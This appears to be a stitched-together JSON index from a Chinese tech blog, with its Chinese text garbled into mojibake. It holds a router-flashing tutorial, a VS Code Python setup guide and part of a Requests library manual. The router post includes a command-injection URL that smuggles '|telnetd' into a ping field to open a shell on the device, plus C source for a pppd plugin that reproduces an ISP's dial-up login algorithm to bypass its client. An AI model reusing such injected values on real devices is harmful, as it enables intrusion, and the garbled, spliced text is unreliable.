è¿™é‡Œçš„sxplugin.soæ˜¯è‡ªå·±æ›´åçš„ï¼Œæ¹–åŒ—çš„å°±é€‰æ‹©wuhançš„æ¥æ›´åï¼Œæ–‡ä»¶åœ¨æ–‡æœ«æœ‰æ‰“åŒ… ** ï¼‰\n4.è®¾ç½®å¸å·å¯†ç æ‹¨å· é€šè¿‡æµè§ˆå™¨ç™»å½•æµè§ˆå™¨æ‰“å¼€ç½‘ç»œä¸‹çš„æ¥å£é€‰æ‹©WANå£ç‚¹å‡»ä¿®æ”¹ï¼Œåè®®é€‰æ‹©PPPOEå³å¯ï¼Œç„¶åä¸‹é¢æœ‰ä¸ªæŒ‰é’®ç‚¹ä¸€ä¸‹ä¼šå‡ºæ¥å¡«å¸å·å¯†ç çš„ï¼Œè´¦æˆ·å’Œå¯†ç ä¹Ÿè¦å†™å¯¹ï¼Œæˆ‘æ˜¯é‡åº†åŠ¨æ€å¯†ç å¯ä»¥æ­£å¸¸ç”¨ã€‚ï¼ˆè“å­—æˆ‘æ˜¯åŠ äº†ä¸­æ–‡åŒ…çš„ï¼Œä½ åˆ·äº†è¿‡åæ˜¯è‹±æ–‡å‘¢ï¼Œå‡‘åˆçœ‹å§ï¼ŒåŠ ä¸­æ–‡åŒ…éœ€è¦è·¯ç”±å™¨è”ç½‘ã€‚ï¼‰\næœ€åç‚¹å‡»ä¿å­˜åº”ç”¨é€€å‡º\n5.æœ€åçš„é…ç½® é€šè¿‡WINSCPç™»å½•è·¯ç”±å™¨åŒæ ·æ‰“å¼€æ–‡ä»¶å¤¹/etc/config/æ‰¾åˆ°networkä¿®æ”¹ åœ¨å›¾ä¸­çš„ä½ç½®è¾“å…¥option \u0026lsquo;pppd_options\u0026rsquo; \u0026lsquo;plugin sxplugin.so\u0026rsquo;è¿™ä¸ªä»£ç å³å¯ï¼ˆæ³¨æ„ç²˜è´´åå­—ä½“æ˜¯å¦ä¸€è‡´ï¼Œä¸»è¦æ˜¯â€˜å·çš„é—®é¢˜ï¼Œå¯ä¿å­˜åå†æ‰“å¼€æŸ¥çœ‹ï¼Œå¿…é¡»æå®šå­—ä½“æ ¼å¼æ‰è¡Œï¼‰ï¼Œåˆ°æ­¤netkeeperå°±å®‰è£…å®Œäº†ã€‚æœ€åé‡å¯è·¯ç”±å™¨ï¼Œåˆ°ç³»ç»Ÿé‡Œé¢é€‰æ—¶åŒºï¼ŒåŒæ­¥æµè§ˆå™¨æ—¶é—´ï¼Œä¿å­˜ã€‚å†åˆ°wanç‚¹å‡»è¿æ¥å°±èƒ½è”ç½‘äº†ã€‚ï¼ˆå¦‚æœè¿›ä¸å»wanè¿™ä¸ªç•Œé¢å°±æ˜¯è®¾ç½®é”™äº†ï¼‰\næœ€åè¦è¯´çš„ï¼Œè¿™ä¸ªå¯ç”¨çš„åŸå› æ˜¯æ¹–åŒ—åœ°åŒºeä¿¡2.5çš„ç®—æ³•ä¾æ—§å¯ç”¨ï¼Œæœ‰çš„åœ°åŒºåŠ äº†å¿ƒè·³ï¼Œæœ‰çš„åœ°åŒºå¼ºåˆ¶å‡çº§äº†ï¼Œå¹¶ä¸å¯ç”¨,æ•™ç¨‹åˆ°æ­¤å¤„å®Œç»“ï¼Œåé¢çš„æœ‰èƒ½åŠ›å¯ä»¥çœ‹çœ‹ï¼Œå·¥å…·æ•™ç¨‹æ‰“åŒ…åœ¨æ–‡æœ«\nâ—†é—ªè®¯ç®—æ³•æºç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;pppd/pppd.h\u0026gt; #include \u0026lt;pppd/md5.h\u0026gt; typedef unsigned char byte; char pppd_version[] = VERSION; static char saveuser[MAXNAMELEN] = {0}; static char savepwd[MAXSECRETLEN] = {0}; static void getPIN(byte *userName, byte *PIN) { int i,j;//å¾ªç¯å˜é‡ long timedivbyfive;//æ—¶é—´é™¤ä»¥äº” time_t timenow;//å½“å‰æ—¶é—´ï¼Œä»time()è·å¾— byte RADIUS[16];//å‡‘ä½å­—ç¬¦ byte timeByte[4];//æ—¶é—´ div 5 byte beforeMD5[32];//æ—¶é—´ div 5+ç”¨æˆ·å+å‡‘ä½ MD5_CTX md5;//MD5ç»“æ„ä½“ byte afterMD5[16];//MD5è¾“å‡º byte MD501H[2]; //MD5å‰ä¸¤ä½ byte MD501[3]; byte timeHash[4]; //æ—¶é—´div5ç»è¿‡ç¬¬ä¸€æ¬¡è½¬ååçš„å€¼ byte temp[32]; //ç¬¬ä¸€æ¬¡è½¬æ¢æ—¶æ‰€ç”¨çš„ä¸´æ—¶æ•°ç»„ byte PIN27[6]; //PINçš„2åˆ°7ä½ï¼Œç”±ç³»ç»Ÿæ—¶é—´è½¬æ¢ //code info(\u0026#34;sxplugin : using zjxinlisx01\u0026#34;); strcpy(RADIUS, \u0026#34;zjxinlisx01\u0026#34;); timenow = time(NULL); timedivbyfive = timenow / 5; for(i = 0; i \u0026lt; 4; i++) { timeByte[i] = (byte)(timedivbyfive \u0026gt;\u0026gt; (8 * (3 - i)) \u0026amp; 0xFF); } for(i = 0; i \u0026lt; 4; i++) { beforeMD5[i]= timeByte[i]; } for(i = 4; i \u0026lt; 16 \u0026amp;\u0026amp; userName[i-4]!=\u0026#39;@\u0026#39; ; i++) { beforeMD5[i] = userName[i-4]; } j=0; while(RADIUS[j]!=\u0026#39;\\0\u0026#39;) beforeMD5[i++] = RADIUS[j++]; MD5_Init(\u0026amp;md5); MD5_Update (\u0026amp;md5, beforeMD5, i); printf(\u0026#34;%d %s\\n\u0026#34;,i,beforeMD5); MD5_Final (afterMD5, \u0026amp;md5); MD501H[0] = afterMD5[0] \u0026gt;\u0026gt; 4 \u0026amp; 0xF; MD501H[1] = afterMD5[0] \u0026amp; 0xF; sprintf(MD501,\u0026#34;%x%x\u0026#34;,MD501H[0],MD501H[1]); for(i = 0; i \u0026lt; 32; i++) { temp[i] = timeByte[(31 - i) / 8] \u0026amp; 1; timeByte[(31 - i) / 8] = timeByte[(31 - i) / 8] \u0026gt;\u0026gt; 1; } for (i = 0; i \u0026lt; 4; i++) { timeHash[i] = temp[i] * 128 + temp[4 + i] * 64 + temp[8 + i] * 32 + temp[12 + i] * 16 + temp[16 + i] * 8 + temp[20 + i] * 4 + temp[24 + i] * 2 + temp[28 + i]; } temp[1] = (timeHash[0] \u0026amp; 3) \u0026lt;\u0026lt; 4; temp[0] = (timeHash[0] \u0026gt;\u0026gt; 2) \u0026amp; 0x3F; temp[2] = (timeHash[1] \u0026amp; 0xF) \u0026lt;\u0026lt; 2; temp[1] = (timeHash[1] \u0026gt;\u0026gt; 4 \u0026amp; 0xF) + temp[1]; temp[3] = timeHash[2] \u0026amp; 0x3F; temp[2] = ((timeHash[2] \u0026gt;\u0026gt; 6) \u0026amp; 0x3) + temp[2]; temp[5] = (timeHash[3] \u0026amp; 3) \u0026lt;\u0026lt; 4; temp[4] = (timeHash[3] \u0026gt;\u0026gt; 2) \u0026amp; 0x3F; for (i = 0; i \u0026lt; 6; i++) { PIN27[i] = temp[i] + 0x020; if(PIN27[i]\u0026gt;=0x40) { PIN27[i]++; } } PIN[0] = \u0026#39;\\r\u0026#39;; PIN[1] = \u0026#39;\\n\u0026#39;; memcpy(PIN+2, PIN27, 6); PIN[8] = MD501[0]; PIN[9] = MD501[1]; strcpy(PIN+10, userName); } static int pap_modifyusername(char *user, char* passwd) { byte PIN[MAXSECRETLEN] = {0}; getPIN(saveuser, PIN); strcpy(user, PIN); info(\u0026#34;sxplugin : user is %s \u0026#34;,user); } static int check(){ return 1; } void plugin_init(void) { info(\u0026#34;sxplugin : init\u0026#34;); strcpy(saveuser,user); strcpy(savepwd,passwd); pap_modifyusername(user, saveuser); info(\u0026#34;sxplugin : passwd loaded\u0026#34;); pap_check_hook=check; chap_check_hook=check; } â—†ä¸‹è½½åœ°å€ (è®¿é—®ç :4854)\n","permalink":"https://www.hacktech.cn/post/%E7%BB%99%E6%96%90%E8%AE%AFk1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98.html","summary":"\u003ch1 id=\"è´­ä¹°æ–è®¯k1è·¯ç”±å™¨\"\u003eâ—†è´­ä¹°æ–è®¯k1è·¯ç”±å™¨\u003c/h1\u003e\n\u003cp\u003eè·¯ç”±å™¨åœ¨å¤©çŒ«äº¬ä¸œæ–è®¯æ——èˆ°åº—éƒ½æœ‰å”®å–ï¼Œæˆ‘ä¹°çš„ä»·æ ¼æ˜¯159ï¼Œä¸è¿‡æœ‰ä¸€å¼ é“ƒé“›å¡ï¼Œä¸€ä¸ªæœˆä¹‹åè¿”è¿˜160å…ƒï¼Œç›¸å½“äº0å…ƒè´­\u003c/p\u003e\n\u003ch1 id=\"è·¯ç”±å™¨åˆ·ä¸æ­»breed\"\u003eâ—†è·¯ç”±å™¨åˆ·ä¸æ­»Breed\u003c/h1\u003e\n\u003ch2 id=\"1è·¯ç”±ä¸ç”µè„‘æœ‰çº¿è¿æ¥å¥½è¾“å…¥19216821å®Œæˆè®¾ç½®\"\u003e1.è·¯ç”±ä¸ç”µè„‘æœ‰çº¿è¿æ¥å¥½ï¼Œè¾“å…¥192.168.2.1ï¼Œå®Œæˆè®¾ç½®\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/466c36655068702d47536a346837465250446263664c6a525f4f6134.png\" alt=\"k1basicSetting\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"2åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥http19216821goformdiagnosispingaddr1921682100echotelnetd\"\u003e2.åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ï¼šhttp://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo\u0026quot;\u0026quot;|telnetd\u003c/h2\u003e\n\u003cp\u003e(å¦‚æœä½ çš„ç”µè„‘ipä¸æ˜¯192.168.2.100,è¯·æ”¹æˆä½ ç”µè„‘çš„ip(å†…ç½‘ip))\u003c/p\u003e","title":"ç»™æ–è®¯K1åˆ·æœºå¹¶æ‹¨å·eä¿¡(æ¹–åŒ—åœ°åŒºæµ‹è¯•æ— é—®é¢˜)"},{"content":"1.å®‰è£…Pythonæ’ä»¶ åœ¨VScodeç•Œé¢æŒ‰Crtl+Shift+Pæˆ–è€…F1\nè¾“å…¥ext install\nç›´æ¥å®‰è£…Pythonï¼Œä¹Ÿå°±æ˜¯ç‚¹å‡»å®ƒï¼Œç„¶åç­‰å¾…ï¼Œå®‰è£…å¥½åä¼šæç¤ºä½ é‡å¯\n2.é…ç½®è¿è¡ŒPythonç¨‹åº åŒæ ·çš„æ‰“å¼€å‘½ä»¤é¢æ¿ï¼ˆCrtl+Shift+Pæˆ–F1ï¼‰ï¼Œç„¶åè¾“å…¥Tasks: Configure Task Runnerï¼ˆä¸­æ–‡è¾“å…¥ï¼šä»»åŠ¡ï¼Œç„¶åé€‰æ‹©ä»»åŠ¡ï¼šé…ç½®ä»»åŠ¡è¿è¡Œç¨‹åºï¼‰ï¼Œé€‰æ‹©Other\næ­¤æ—¶VScodeä¼šè‡ªåŠ¨ç”Ÿæˆ.vscodeæ–‡ä»¶å¤¹å¹¶ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„task.json\né…ç½®å¦‚ä¸‹\n\u0026quot;version\u0026quot;: \u0026quot;0.1.0\u0026quot;, \u0026quot;command\u0026quot;: \u0026quot;python\u0026quot;, \u0026quot;isShellCommand\u0026quot;: true, \u0026quot;args\u0026quot;: [\u0026quot;${file}\u0026quot;], \u0026quot;showOutput\u0026quot;: \u0026quot;always\u0026quot; ç„¶åå†™å®Œä»£ç å Crtl+Shift+Bè¿è¡ŒPyç¨‹åº ","permalink":"https://www.hacktech.cn/post/visual-studio-code%E9%85%8D%E7%BD%AEpython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html","summary":"\u003ch1 id=\"1å®‰è£…pythonæ’ä»¶\"\u003e1.å®‰è£…Pythonæ’ä»¶\u003c/h1\u003e\n\u003cp\u003eåœ¨VScodeç•Œé¢æŒ‰\u003ccode\u003eCrtl\u003c/code\u003e+\u003ccode\u003eShift\u003c/code\u003e+\u003ccode\u003eP\u003c/code\u003eæˆ–è€…\u003ccode\u003eF1\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eè¾“å…¥\u003ccode\u003eext install\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/466e425945714456686a364e627865744763442d414838515f653955.png\" alt=\"ext install\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eç›´æ¥å®‰è£…\u003ccode\u003ePython\u003c/code\u003eï¼Œä¹Ÿå°±æ˜¯ç‚¹å‡»å®ƒï¼Œç„¶åç­‰å¾…ï¼Œå®‰è£…å¥½åä¼šæç¤ºä½ é‡å¯\u003c/p\u003e","title":"Visual Studio Codeé…ç½®Pythonå¼€å‘ç¯å¢ƒ"},{"content":" é«˜çº§ç”¨æ³• æœ¬ç¯‡æ–‡æ¡£æ¶µç›–äº†Requestsçš„ä¸€äº›æ›´åŠ é«˜çº§çš„ç‰¹æ€§ã€‚\nä¼šè¯å¯¹è±¡ ä¼šè¯å¯¹è±¡è®©ä½ èƒ½å¤Ÿè·¨è¯·æ±‚ä¿æŒæŸäº›å‚æ•°ã€‚å®ƒä¹Ÿä¼šåœ¨åŒä¸€ä¸ªSessionå®ä¾‹å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚ä¹‹é—´ä¿æŒcookiesã€‚\nä¼šè¯å¯¹è±¡å…·æœ‰ä¸»è¦çš„Requests APIçš„æ‰€æœ‰æ–¹æ³•ã€‚\næˆ‘ä»¬æ¥è·¨è¯·æ±‚ä¿æŒä¸€äº›cookies:\n1 2 3 4 5 6 7 s = requests.Session() s.get(\u0026#39;http://httpbin.org/cookies/set/sessioncookie/123456789\u0026#39;) r = s.get(\u0026#34;http://httpbin.org/cookies\u0026#34;) print(r.text) # \u0026#39;{\u0026#34;cookies\u0026#34;: {\u0026#34;sessioncookie\u0026#34;: \u0026#34;123456789\u0026#34;}}\u0026#39; ä¼šè¯ä¹Ÿå¯ç”¨æ¥ä¸ºè¯·æ±‚æ–¹æ³•æä¾›ç¼ºçœæ•°æ®ã€‚è¿™æ˜¯é€šè¿‡ä¸ºä¼šè¯å¯¹è±¡çš„å±æ€§æä¾›æ•°æ®æ¥å®ç°çš„:\n1 2 3 4 5 6 s = requests.Session() s.auth = (\u0026#39;user\u0026#39;, \u0026#39;pass\u0026#39;) s.headers.update({\u0026#39;x-test\u0026#39;: \u0026#39;true\u0026#39;}) # both \u0026#39;x-test\u0026#39; and \u0026#39;x-test2\u0026#39; are sent s.get(\u0026#39;http://httpbin.org/headers\u0026#39;, headers={\u0026#39;x-test2\u0026#39;: \u0026#39;true\u0026#39;}) ä»»ä½•ä½ ä¼ é€’ç»™è¯·æ±‚æ–¹æ³•çš„å­—å…¸éƒ½ä¼šä¸å·²è®¾ç½®ä¼šè¯å±‚æ•°æ®åˆå¹¶ã€‚æ–¹æ³•å±‚çš„å‚æ•°è¦†ç›–ä¼šè¯çš„å‚æ•°ã€‚\nä»å­—å…¸å‚æ•°ä¸­ç§»é™¤ä¸€ä¸ªå€¼ æœ‰æ—¶ä½ ä¼šæƒ³çœç•¥å­—å…¸å‚æ•°ä¸­ä¸€äº›ä¼šè¯å±‚çš„é”®ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½ åªéœ€ç®€å•åœ°åœ¨æ–¹æ³•å±‚å‚æ•°ä¸­å°†é‚£ä¸ªé”®çš„å€¼è®¾ç½®ä¸º None ï¼Œé‚£ä¸ªé”®å°±ä¼šè¢«è‡ªåŠ¨çœç•¥æ‰ã€‚\nåŒ…å«åœ¨ä¸€ä¸ªä¼šè¯ä¸­çš„æ‰€æœ‰æ•°æ®ä½ éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚å­¦ä¹ æ›´å¤šç»†èŠ‚è¯·é˜…è¯» ä¼šè¯APIæ–‡æ¡£ ã€‚\nè¯·æ±‚ä¸å“åº”å¯¹è±¡ ä»»ä½•æ—¶å€™è°ƒç”¨requests.*()ä½ éƒ½åœ¨åšä¸¤ä»¶ä¸»è¦çš„äº‹æƒ…ã€‚å…¶ä¸€ï¼Œä½ åœ¨æ„å»ºä¸€ä¸ª Request å¯¹è±¡ï¼Œ è¯¥å¯¹è±¡å°†è¢«å‘é€åˆ°æŸä¸ªæœåŠ¡å™¨è¯·æ±‚æˆ–æŸ¥è¯¢ä¸€äº›èµ„æºã€‚å…¶äºŒï¼Œä¸€æ—¦ requests å¾—åˆ°ä¸€ä¸ªä» æœåŠ¡å™¨è¿”å›çš„å“åº”å°±ä¼šäº§ç”Ÿä¸€ä¸ª Response å¯¹è±¡ã€‚è¯¥å“åº”å¯¹è±¡åŒ…å«æœåŠ¡å™¨è¿”å›çš„æ‰€æœ‰ä¿¡æ¯ï¼Œ ä¹ŸåŒ…å«ä½ åŸæ¥åˆ›å»ºçš„ Request å¯¹è±¡ã€‚å¦‚ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„è¯·æ±‚ï¼Œä»Wikipediaçš„æœåŠ¡å™¨å¾—åˆ° ä¸€äº›éå¸¸é‡è¦çš„ä¿¡æ¯:\n1 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;http://en.wikipedia.org/wiki/Monty_Python\u0026#39;) å¦‚æœæƒ³è®¿é—®æœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬çš„å“åº”å¤´éƒ¨ä¿¡æ¯ï¼Œå¯ä»¥è¿™æ ·åš:\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; r.headers {\u0026#39;content-length\u0026#39;: \u0026#39;56170\u0026#39;, \u0026#39;x-content-type-options\u0026#39;: \u0026#39;nosniff\u0026#39;, \u0026#39;x-cache\u0026#39;: \u0026#39;HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet\u0026#39;, \u0026#39;content-encoding\u0026#39;: \u0026#39;gzip\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;3080\u0026#39;, \u0026#39;content-language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;vary\u0026#39;: \u0026#39;Accept-Encoding,Cookie\u0026#39;, \u0026#39;server\u0026#39;: \u0026#39;Apache\u0026#39;, \u0026#39;last-modified\u0026#39;: \u0026#39;Wed, 13 Jun 2012 01:33:50 GMT\u0026#39;, \u0026#39;connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;cache-control\u0026#39;: \u0026#39;private, s-maxage=0, max-age=0, must-revalidate\u0026#39;, \u0026#39;date\u0026#39;: \u0026#39;Thu, 14 Jun 2012 12:59:39 GMT\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;text/html; charset=UTF-8\u0026#39;, \u0026#39;x-cache-lookup\u0026#39;: \u0026#39;HIT from cp1006.eqiad.wmnet:3128, MISS from cp1010.eqiad.wmnet:80\u0026#39;} ç„¶è€Œï¼Œå¦‚æœæƒ³å¾—åˆ°å‘é€åˆ°æœåŠ¡å™¨çš„è¯·æ±‚çš„å¤´éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°è®¿é—®è¯¥è¯·æ±‚ï¼Œç„¶åæ˜¯è¯¥è¯·æ±‚çš„å¤´éƒ¨:\n1 2 3 \u0026gt;\u0026gt;\u0026gt; r.request.headers {\u0026#39;Accept-Encoding\u0026#39;: \u0026#39;identity, deflate, compress, gzip\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/0.13.1\u0026#39;} Prepared Request å½“ä½ ä»APIè°ƒç”¨æˆ–Sessionè°ƒç”¨å¾—åˆ°ä¸€ä¸ªResponseå¯¹è±¡ï¼Œå¯¹äºè¿™ä¸ªçš„requestå±æ€§å®é™…ä¸Šæ˜¯è¢«ä½¿ç”¨çš„PreparedRequestï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä½ å¯èƒ½å¸Œæœ›åœ¨å‘é€è¯·æ±‚ä¹‹å‰å¯¹bodyå’Œheaders(æˆ–å…¶ä»–ä¸œè¥¿)åšäº›é¢å¤–çš„å·¥ä½œï¼Œä¸€ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from requests import Request, Session s = Session() req = Request(\u0026#39;GET\u0026#39;, url, data=data, headers=header ) prepped = req.prepare() # do something with prepped.body # do something with prepped.headers resp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout ) print(resp.status_code) å› ä¸ºä½ æ²¡æœ‰ç”¨Requestå¯¹è±¡åšä»»ä½•ç‰¹åˆ«çš„äº‹æƒ…ï¼Œä½ åº”è¯¥ç«‹å³å°è£…å®ƒå’Œä¿®æ”¹ PreparedRequest å¯¹è±¡ï¼Œç„¶åæºå¸¦ç€ä½ æƒ³è¦å‘é€åˆ°requests.* æˆ– Session.*çš„å…¶ä»–å‚æ•°æ¥å‘é€å®ƒ\nä½†æ˜¯ï¼Œä¸Šé¢çš„ä»£ç ä¼šä¸§å¤±ä¸€äº›Requests Sessionå¯¹è±¡çš„ä¼˜åŠ¿ï¼Œç‰¹åˆ«çš„ï¼ŒSessionå±‚çš„çŠ¶æ€æ¯”å¦‚cookiesä¸ä¼šè¢«åº”ç”¨åˆ°ä½ çš„å…¶ä»–è¯·æ±‚ä¸­ï¼Œè¦ä½¿å®ƒå¾—åˆ°åº”ç”¨ï¼Œä½ å¯ä»¥ç”¨*Session.prepare_request()*æ¥æ›¿æ¢ Request.prepare()ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from requests import Request, Session s = Session() req = Request(\u0026#39;GET\u0026#39;, url, data=data headers=headers ) prepped = s.prepare_request(req) # do something with prepped.body # do something with prepped.headers resp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout ) print(resp.status_code) SSLè¯ä¹¦éªŒè¯ Requestså¯ä»¥ä¸ºHTTPSè¯·æ±‚éªŒè¯SSLè¯ä¹¦ï¼Œå°±åƒwebæµè§ˆå™¨ä¸€æ ·ã€‚è¦æƒ³æ£€æŸ¥æŸä¸ªä¸»æœºçš„SSLè¯ä¹¦ï¼Œä½ å¯ä»¥ä½¿ç”¨ verify å‚æ•°:\n1 2 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;https://kennethreitz.com\u0026#39;, verify=True) requests.exceptions.SSLError: hostname \u0026#39;kennethreitz.com\u0026#39; doesn\u0026#39;t match either of \u0026#39;*.herokuapp.com\u0026#39;, \u0026#39;herokuapp.com\u0026#39; åœ¨è¯¥åŸŸåä¸Šæˆ‘æ²¡æœ‰è®¾ç½®SSLï¼Œæ‰€ä»¥å¤±è´¥äº†ã€‚ä½†Githubè®¾ç½®äº†SSL:\n1 2 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;https://github.com\u0026#39;, verify=True) \u0026lt;Response [200]\u0026gt; å¯¹äºç§æœ‰è¯ä¹¦ï¼Œä½ ä¹Ÿå¯ä»¥ä¼ é€’ä¸€ä¸ªCA_BUNDLEæ–‡ä»¶çš„è·¯å¾„ç»™ verify ã€‚ä½ ä¹Ÿå¯ä»¥è®¾ç½® REQUEST_CA_BUNDLE ç¯å¢ƒå˜é‡ã€‚\nå¦‚æœä½ å°†verifyè®¾ç½®ä¸ºFalseï¼ŒRequestsä¹Ÿèƒ½å¿½ç•¥å¯¹SSLè¯ä¹¦çš„éªŒè¯ã€‚\n1 2 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;https://kennethreitz.com\u0026#39;, verify=False) \u0026lt;Response [200]\u0026gt; é»˜è®¤æƒ…å†µä¸‹ï¼Œ verify æ˜¯è®¾ç½®ä¸ºTrueçš„ã€‚é€‰é¡¹ verify ä»…åº”ç”¨äºä¸»æœºè¯ä¹¦ã€‚\nä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªæœ¬åœ°è¯ä¹¦ç”¨ä½œå®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¯ä»¥æ˜¯å•ä¸ªæ–‡ä»¶ï¼ˆåŒ…å«å¯†é’¥å’Œè¯ä¹¦ï¼‰æˆ–ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªæ–‡ä»¶è·¯å¾„çš„å…ƒç»„:\n1 2 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;https://kennethreitz.com\u0026#39;, cert=(\u0026#39;/path/server.crt\u0026#39;, \u0026#39;/path/key\u0026#39;)) \u0026lt;Response [200]\u0026gt; å¦‚æœä½ æŒ‡å®šäº†ä¸€ä¸ªé”™è¯¯è·¯å¾„æˆ–ä¸€ä¸ªæ— æ•ˆçš„è¯ä¹¦:\n1 2 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;https://kennethreitz.com\u0026#39;, cert=\u0026#39;/wrong_path/server.pem\u0026#39;) SSLError: [Errno 336265225] _ssl.c:347: error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib å“åº”ä½“å†…å®¹å·¥ä½œæµ é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä½ è¿›è¡Œç½‘ç»œè¯·æ±‚åï¼Œå“åº”ä½“ä¼šç«‹å³è¢«ä¸‹è½½ã€‚ä½ å¯ä»¥é€šè¿‡ stream å‚æ•°è¦†ç›–è¿™ä¸ªè¡Œä¸ºï¼Œæ¨è¿Ÿä¸‹è½½å“åº”ä½“ç›´åˆ°è®¿é—® Response.content å±æ€§:\n1 2 tarball_url = \u0026#39;https://github.com/kennethreitz/requests/tarball/master\u0026#39; r = requests.get(tarball_url, stream=True) æ­¤æ—¶ä»…æœ‰å“åº”å¤´è¢«ä¸‹è½½ä¸‹æ¥äº†ï¼Œè¿æ¥ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå› æ­¤å…è®¸æˆ‘ä»¬æ ¹æ®æ¡ä»¶è·å–å†…å®¹:\n1 2 3 if int(r.headers[\u0026#39;content-length\u0026#39;]) \u0026lt; TOO_LONG: content = r.content ... ä½ å¯ä»¥è¿›ä¸€æ­¥ä½¿ç”¨ Response.iter_content å’Œ Response.iter_lines æ–¹æ³•æ¥æ§åˆ¶å·¥ä½œæµï¼Œæˆ–è€…ä»¥ Response.raw ä»åº•å±‚urllib3çš„ urllib3.HTTPResponse \u0026lt;urllib3.response.HTTPResponse è¯»å–ã€‚\nå¦‚æœå½“ä½ è¯·æ±‚æ—¶è®¾ç½®streamä¸ºTrueï¼ŒRequestså°†ä¸èƒ½é‡Šæ”¾è¿™ä¸ªè¿æ¥ä¸ºè¿æ¥æ± ï¼Œé™¤éä½ è¯»å–äº†å…¨éƒ¨æ•°æ®æˆ–è€…è°ƒç”¨äº†Response.closeï¼Œè¿™æ ·ä¼šä½¿è¿æ¥å˜å¾—ä½æ•ˆç‡ã€‚å¦‚æœå½“ä½ è®¾ç½® stream = True æ—¶ä½ å‘ç°ä½ è‡ªå·±éƒ¨åˆ†åœ°è¯»å–äº†å“åº”ä½“æ•°æ®(æˆ–è€…å®Œå…¨æ²¡è¯»å–å“åº”ä½“æ•°æ®)ï¼Œä½ åº”è¯¥è€ƒè™‘ä½¿ç”¨contextlib.closing,æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­:\n1 2 3 4 from contextlib import closing with closing(requests.get(\u0026#39;http://httpbin.org/get\u0026#39;, stream=True)) as r: # Do things with the response here. ä¿æŒæ´»åŠ¨çŠ¶æ€ï¼ˆæŒä¹…è¿æ¥ï¼‰ å¥½æ¶ˆæ¯ - å½’åŠŸäºurllib3ï¼ŒåŒä¸€ä¼šè¯å†…çš„æŒä¹…è¿æ¥æ˜¯å®Œå…¨è‡ªåŠ¨å¤„ç†çš„ï¼åŒä¸€ä¼šè¯å†…ä½ å‘å‡ºçš„ä»»ä½•è¯·æ±‚éƒ½ä¼šè‡ªåŠ¨å¤ç”¨æ°å½“çš„è¿æ¥ï¼\næ³¨æ„ï¼šåªæœ‰æ‰€æœ‰çš„å“åº”ä½“æ•°æ®è¢«è¯»å–å®Œæ¯•è¿æ¥æ‰ä¼šè¢«é‡Šæ”¾ä¸ºè¿æ¥æ± ï¼›æ‰€ä»¥ç¡®ä¿å°† stream è®¾ç½®ä¸º False æˆ–è¯»å– Response å¯¹è±¡çš„ content å±æ€§ã€‚\næµå¼ä¸Šä¼  Requestsæ”¯æŒæµå¼ä¸Šä¼ ï¼Œè¿™å…è®¸ä½ å‘é€å¤§çš„æ•°æ®æµæˆ–æ–‡ä»¶è€Œæ— 